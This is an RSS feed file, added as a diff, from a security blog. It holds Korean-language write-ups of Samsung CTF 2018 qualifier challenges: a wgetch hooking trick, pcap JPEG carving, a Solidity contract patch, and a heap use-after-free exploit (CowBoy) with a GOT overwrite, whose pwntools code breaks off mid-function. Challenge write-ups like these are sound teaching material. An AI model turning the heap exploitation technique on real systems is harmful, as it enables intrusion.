@@ -1,0 +1,425 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+      <title>sm1ee.github.io/</title>
+   
+   <link>https://sm1ee.github.io/</link>
+   <description>Computer Security, Programming, Life...</description>
+   <language>en-uk</language>
+   <managingEditor> </managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+	  <title>[Samsung CTF 2018 Quals] - dingJMax</title>
+	  <link>//Samsung-CTF-2018-Quals-dingJMax</link>
+	  <author></author>
+	  <pubDate>2018-07-21T00:00:00+00:00</pubDate>
+	  <guid>//Samsung-CTF-2018-Quals-dingJMax</guid>
+	  <description><![CDATA[
+	     <p><a href="https://github.com/sm1ee/ctf/blob/master/sctf2018/dingJMax/dingJMax_e524bb0f4410c9be57cf1c387ab79872dcbbf592">dingJMax</a>
+<img src="/assets/images/sctf2018/dingJMax/1.png" width="100%" /></p>
+
+<p>이 문제는 분석을 대충해서 푸는데 꽤 시간이 걸렸다..</p>
+
+<p>실행시키면 다음과 같이 게임이 실행되는데 입력 마다 flag값이 바뀌고 판정에 의해 점수를 받는다. <br />
+<img src="/assets/images/sctf2018/dingJMax/2.png" width="100%" /></p>
+
+<p>문제에서 제시한 조건을 만족하고 flag를 횓득하려면 ALL Pertect가 나와야 한다. <del>사실상 손으로는 불가 능하다.</del></p>
+
+<p>바이너리를 보면 Note의 속도나 순서가 고정되어 있고 판정이나 점수가 flag에 직접적인 영향을 주진 않는다.<br />
+<img src="/assets/images/sctf2018/dingJMax/4.png" width="100%" /></p>
+
+<p>그렇다면 입력 값에 의해 flag가 변경되고 Note가 고정이기 때문에 Note의 순서만 정확하게 입력된다면 flag 획득할 수 있다. <del>그런 줄 알았다</del></p>
+
+<p>Note를 parsing 하여 d,f,j,k 값으로 바꿔서 <strong>pwntools</strong>로 입력을 줬지만 역시 flag는 획득하지 못했다.<br />
+바이너리를 다시보니 flag 값을 변경할 때 i 값에 영향을 받고 있었고 i 값이 20배 수 일 때 노트 위치가 이동된다.<br />
+<img src="/assets/images/sctf2018/dingJMax/3.png" width="100%" /></p>
+
+<p>Perfect 판정의 경우 0x60764C 주소를 기준으로 다음과 같이 각각 1byte씩 판정 라인을 두고 있다.</p>
+<blockquote>
+  <p>d : 0x60764C<br />
+f : 0x60764D<br />
+j : 0x60764E<br />
+k : 0x60764F</p>
+</blockquote>
+
+<p>만약 j를 입력했다면 0x60764E 주소에 ‘o’ 값이 존재하는지 확인하고 i 값이 20의 배수일 때 Perfect 판정이 된다.<br />
+<img src="/assets/images/sctf2018/dingJMax/5.png" width="100%" /></p>
+
+<p>결국 꼼수는 없고 DBI나 binary patch 등 여러 방법이 있을 것 같은데, 나 같은 경우 <strong>wgetch</strong> 함수를 hooking하여 해결했다.</p>
+
+<p><strong>wgetch</strong> 함수를 후킹한 이유는 다음과 같다.</p>
+<ul>
+  <li>후킹된 함수에서 input을 control 할 수 있어야 한다.</li>
+  <li>판정라인 이 후 사용되는 함수 hooking 시 이미 늦다.</li>
+  <li>위 조건들을 만족하며 가장 간단하게 hooking 할 수 있다.</li>
+</ul>
+
+<h2 id="solve-code">Solve code:</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include &lt;ncurses.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdio.h&gt;
+</span>
+
+<span class="k">typedef</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">origin_wgetch</span><span class="p">)(</span><span class="n">WINDOW</span><span class="o">*</span><span class="p">);</span>
+
+<span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="n">wgetch</span><span class="p">(</span><span class="n">WINDOW</span> <span class="o">*</span><span class="n">win</span><span class="p">){</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">line</span> <span class="o">=</span> <span class="mh">0x0000000000607648</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">'d'</span><span class="p">,</span><span class="sc">'f'</span><span class="p">,</span><span class="sc">'j'</span><span class="p">,</span><span class="sc">'k'</span><span class="p">};</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'o'</span> <span class="o">&amp;&amp;</span> <span class="o">++</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">20</span><span class="p">){</span>
+                                <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                                <span class="k">return</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="n">origin_wgetch</span> <span class="n">_wgetch</span> <span class="o">=</span> <span class="p">(</span><span class="n">origin_wgetch</span><span class="p">)</span><span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"wgetch"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">_wgetch</span><span class="p">(</span><span class="n">win</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>[Samsung CTF 2018 Quals] - HideInSSL</title>
+	  <link>//Samsung-CTF-2018-Quals-HideInSSL</link>
+	  <author></author>
+	  <pubDate>2018-07-21T00:00:00+00:00</pubDate>
+	  <guid>//Samsung-CTF-2018-Quals-HideInSSL</guid>
+	  <description><![CDATA[
+	     <p><a href="https://github.com/sm1ee/ctf/blob/master/sctf2018/HideInSSL/sslpacket.pcap">sslpacket.pcap</a>  //After “Export Specified Packets”
+<img src="/assets/images/sctf2018/hideinssl/1.png" width="100%" /></p>
+
+<p>패킷을 분석해보면 아래와 같이 192.168.0.107, 192.168.0.128의 SSL handshake가 제대로 이루어지지 않으며 계속 동일한 패턴의 request, response가 이루어진다.<br />
+<img src="/assets/images/sctf2018/hideinssl/2.png" width="100%" /></p>
+
+<p>SSL handshake가 이루어지지 않았기 때문에 reponse의 내용이 그대로 보이며 client hello requset의 부분을 보면 jpg 매직넘버인 JFIF 값과 다음 패킷에서 데이터 조각을 볼 수 있다.
+<img src="/assets/images/sctf2018/hideinssl/3.png" width="100%" /></p>
+
+<p>Client hello request 패킷을 보다 해당 부분의 패킷이 jpg의 데이터 조각인 것을 알 수 있는데 jpg의 매직넘버의 시작은 ff d8로 시작하기 때문에 앞의 4byte를 제외하고 TCP payload에서 볼 때 0x13 ~ 0x2b의 범위가 순수하게 전달하고 하는 payload인 것을 알 수 있다.
+<img src="/assets/images/sctf2018/hideinssl/4.png" width="100%" /></p>
+
+<p>Response 부분을 보면 0 또는 1의 응답을 주는 것을 알 수 있는데 0일 때 완전히 동일한 payload를 전송하는 것으로 봐서 정상적인 수신 여부를 sender에게 알려주는 것으로 보인다.
+<img src="/assets/images/sctf2018/hideinssl/5.png" width="100%" /></p>
+
+<p>jpg의 끝인 ff d9 payload를 가지는 패킷의 다음 요청에는 Client Hello, Continuation Data를 전송하며 그 후에는 FIN, ACK의 응답이 온다. 이로써 TCP 3way – handshake이후 FIN, ACK까지의 패킷의 payload를 합치면 jpg file 구조가 완성된다.
+<img src="/assets/images/sctf2018/hideinssl/6.png" width="100%" /></p>
+
+<p>Client Hello, Continuation Data 패킷의 개수를 보면 총 24개인데 2개의 패킷(247, 250 length)을 보면 흐름 상 끝 맺는 패킷이 아님을 알 수 있다.<br />
+그래서 총 22개의 jpg를 가지고 있다고 보면 된다.
+<img src="/assets/images/sctf2018/hideinssl/7.png" width="100%" /></p>
+
+<p>이제 parsing하여 22개의 jpg로 만들기만 하면 된다.<br />
+ip header를 parsing하면 되지만 Export Specified Packets로 두 ip의 패킷으로만 구성된 pcap을 가지고 parsing을 진행하였다.
+<img src="/assets/images/sctf2018/hideinssl/8.png" width="100%" /></p>
+
+<h1 id="solve-code">Solve code</h1>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">requset</span><span class="p">(</span><span class="n">_packet</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">_packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">[</span><span class="mh">0x13</span><span class="p">:</span><span class="mh">0x2B</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">response</span><span class="p">(</span><span class="n">_packet</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">_packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+<span class="n">jpg_gadget</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">packets</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s">'./sslpacket.pcap'</span><span class="p">)</span> 
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Start"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">packet</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">packets</span><span class="p">):</span>
+    <span class="n">packet_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">packet_len</span> <span class="o">==</span> <span class="mi">74</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">flags</span> <span class="o">==</span> <span class="mh">0x02</span><span class="p">:</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag_</span><span class="si">%</span><span class="s">s.jpg"</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">packet_len</span> <span class="o">&gt;=</span> <span class="mi">246</span> <span class="ow">and</span> <span class="n">packet_len</span> <span class="o">&lt;=</span> <span class="mi">250</span><span class="p">:</span>
+        <span class="n">jpg_gadget</span> <span class="o">=</span> <span class="n">requset</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">packet_len</span> <span class="o">==</span> <span class="mi">67</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">response</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">jpg_gadget</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">packet_len</span> <span class="o">==</span> <span class="mi">270</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Wrote it in file."</span><span class="p">)</span>
+        <span class="n">EOF</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>[Samsung CTF 2018 Quals] - BankRobber</title>
+	  <link>//Samsung-CTF-2018-Quals-BankRobber</link>
+	  <author></author>
+	  <pubDate>2018-07-21T00:00:00+00:00</pubDate>
+	  <guid>//Samsung-CTF-2018-Quals-BankRobber</guid>
+	  <description><![CDATA[
+	     <p><img src="/assets/images/sctf2018/bankrobber/1.png" width="100%" /></p>
+
+<p>스마트 컨트랙트관련 문제인데 처음 접해봐서 좀 헤맸는데 풀고나니 엄청 쉬운 문제였다.<br />
+문제 자체는 <strong>solidity</strong>에서 일어날 수 있는 몇 가지 issue에 관해서 시큐어 코딩을하면 된다.<br />
+처음에는 <strong>solidity</strong>에서 일어났던 보안 issue 들을 찾고 패치하는 식으로 진행하였는데,<br />
+hitcon 2018에서 취약점 점검 도구인 <a href="https://github.com/ConsenSys/mythril">MyThril</a>를 공개하여 이를 사용하여 진행하였다.</p>
+
+<p>사용법은 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker pull mythril/myth
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo docker run -v SCTFBank.sol:/SCTFBank.sol mythril/myth -x /SCTFBank.sol
+</code></pre></div></div>
+
+<p>실행하면 다음과 같이 reporting을 해준다.<br />
+<img src="/assets/images/sctf2018/bankrobber/2.png" width="100%" /></p>
+
+<p>issue를 모두 패치 한 후 서버에 전달하면 flag를 획득할 수 있다.</p>
+
+<h2 id="solve-code">Solve code:</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="s">"bankrobber.eatpwnnosleep.com"</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">4567</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">auth</span><span class="p">():</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"API key required : "</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"349b7ec9c6b3caa710b03589aede7a9bcf2c1466307e7f6a3ce3ef1b8c30aa0e"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">solver</span><span class="p">():</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"SCTFBank.sol"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">auth</span><span class="p">()</span>
+<span class="n">solver</span><span class="p">()</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="sctfbanksol">SCTFBank.sol</h2>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">SCTFBank</span><span class="p">{</span>
+    <span class="nx">event</span> <span class="nx">LogBalance</span><span class="p">(</span><span class="nx">address</span> <span class="nx">addr</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">);</span>
+    <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint256</span><span class="p">)</span> <span class="kr">private</span> <span class="nx">balance</span><span class="p">;</span>
+    <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">bool</span><span class="p">)</span> <span class="kr">private</span> <span class="nx">claimedBonus</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="kr">private</span> <span class="nx">donation_deposit</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="kr">private</span> <span class="nx">owner</span><span class="p">;</span>
+
+    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">showBalance</span><span class="p">(</span><span class="nx">address</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">emit</span> <span class="nx">LogBalance</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">balance</span><span class="p">[</span><span class="nx">addr</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">value</span><span class="p">)</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">value</span><span class="p">);</span>
+        <span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
+
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">value</span> <span class="o">&amp;&amp;</span> <span class="nx">balance</span><span class="p">[</span><span class="nx">to</span><span class="p">]</span><span class="o">+</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">balance</span><span class="p">[</span><span class="nx">to</span><span class="p">]);</span>
+        <span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="nx">balance</span><span class="p">[</span><span class="nx">to</span><span class="p">]</span><span class="o">+=</span><span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">multiTransfer</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span> <span class="nx">to_list</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+	<span class="nx">uint256</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="nx">value</span><span class="o">*</span><span class="nx">to_list</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+	<span class="nx">require</span><span class="p">(</span><span class="nx">tmp</span> <span class="o">/</span> <span class="nx">value</span> <span class="o">==</span> <span class="nx">to_list</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="nx">value</span><span class="o">*</span><span class="nx">to_list</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
+        <span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="p">(</span><span class="nx">value</span><span class="o">*</span><span class="nx">to_list</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+        <span class="k">for</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">to_list</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+            <span class="nx">require</span><span class="p">(</span><span class="nx">balance</span><span class="p">[</span><span class="nx">to_list</span><span class="p">[</span><span class="nx">i</span><span class="p">]]</span><span class="o">+</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">balance</span><span class="p">[</span><span class="nx">to_list</span><span class="p">[</span><span class="nx">i</span><span class="p">]]);</span>
+            <span class="nx">balance</span><span class="p">[</span><span class="nx">to_list</span><span class="p">[</span><span class="nx">i</span><span class="p">]]</span> <span class="o">+=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">donate</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">value</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">value</span><span class="p">);</span>
+        <span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">donation_deposit</span><span class="o">+</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">donation_deposit</span><span class="p">);</span>
+        <span class="nx">donation_deposit</span> <span class="o">+=</span> <span class="nx">value</span><span class="p">;</span>
+
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">deliver</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="o">!</span><span class="nx">claimedBonus</span><span class="p">[</span><span class="nx">to</span><span class="p">]);</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span>
+        <span class="nx">claimedBonus</span><span class="p">[</span><span class="nx">to</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="nx">to</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">donation_deposit</span><span class="p">);</span>
+        <span class="nx">donation_deposit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="p">()</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="o">+</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]);</span>
+        <span class="nx">balance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="o">+=</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">//END</span>
+
+</code></pre></div></div>
+
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>[Samsung CTF 2018 Quals] - CowBoy</title>
+	  <link>//Samsung-CTF-2018-Quals-CowBoy</link>
+	  <author></author>
+	  <pubDate>2018-07-19T10:18:00+00:00</pubDate>
+	  <guid>//Samsung-CTF-2018-Quals-CowBoy</guid>
+	  <description><![CDATA[
+	     <p><a href="https://github.com/sm1ee/ctf/blob/master/sctf2018/cowboy/cowboy">Cowboy</a>, <a href="https://github.com/sm1ee/ctf/blob/master/sctf2018/cowboy/libc.so">libc.so</a>
+<img src="/assets/images/sctf2018/cowboy/1.png" width="100%" /></p>
+
+<p>mmap으로 메모리를 할당해 놓고, 자체적으로 구현한 bin list를 이용하여 메모리를 관리한다.<br />
+바이너리를 열어보면 <strong>alloc, free, show heap chunk, fill_data, exit</strong> 총 <strong>5가지</strong>의 함수가 존재한다.</p>
+
+<p>기능은 다음과 같다.</p>
+<blockquote>
+  <p><strong>alloc</strong> : 원하는 사이즈 만큼 할당 (size &lt; 2049)<br />
+<strong>free</strong> : 지정한 chunk 해제<br />
+<strong>show heap chunk</strong> : bin list와 chunk의 주소 출력<br />
+<strong>fill_data</strong> : 원하는 chunk의 data 부분에 데이터 작성<br />
+**exit : 종료</p>
+</blockquote>
+
+<p>총 8개의 bins로 chunk를 관리하며 각각의 bins의 크기는 다음과 같다.<br />
+<img src="/assets/images/sctf2018/cowboy/3.png" width="100%" /></p>
+
+<p>fill_data는 chunk에 입력 값을 write하는데 buf의 용도로 해당 chunk의 크기와 동일한 크기의 동적할당하여 memcpy 이후 해제된다.<br />
+<img src="/assets/images/sctf2018/cowboy/4.png" width="100%" /></p>
+
+<p>이것과 alloc 이용해서 UAF를 트리거 시킬 수 있는데 chunk의 next 부분이 초기화 되지 않아서 fill_data에서 입력한 값으로 설정된다.</p>
+
+<p>여기서 show heap cunk함수로 libc leak을 할 수 있다.</p>
+
+<p>동일한 방법으로 got 주소를 가리키는 주소로 UAF 트리거 하여 bin에 적재하고 fill_data 함수로 got overwrite하면 된다.</p>
+
+<p>처음엔 Free를 one shot gadget으로 덮었지만 조건이 맞지 않아 실패하였고 exit를 덮는 방법으로 바꿔서 풀 수 있었다.</p>
+
+<h2 id="exploit-code">Exploit code:</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="s">"cowboy.eatpwnnosleep.com"</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">14697</span>
+<span class="n">binary</span> <span class="o">=</span> <span class="s">"./cowboy"</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="n">rand_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'rand'</span><span class="p">]</span>
+<span class="n">rand_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'rand'</span><span class="p">]</span>
+
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so"</span><span class="p">)</span>
+<span class="n">rand_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'rand'</span><span class="p">]</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">exit_got_ptr</span> <span class="o">=</span> <span class="mh">0x0000000000400708</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">auth</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">'apikey'</span> <span class="p">:</span> <span class="s">'349b7ec9c6b3caa710b03589aede7a9bcf2c1466307e7f6a3ce3ef1b8c30aa0e'</span><span class="p">,</span>
+        <span class="p">}</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">102400</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">_index</span><span class="p">):</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"5. exit"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"----------------------------------------"</span><span class="p">)</span>
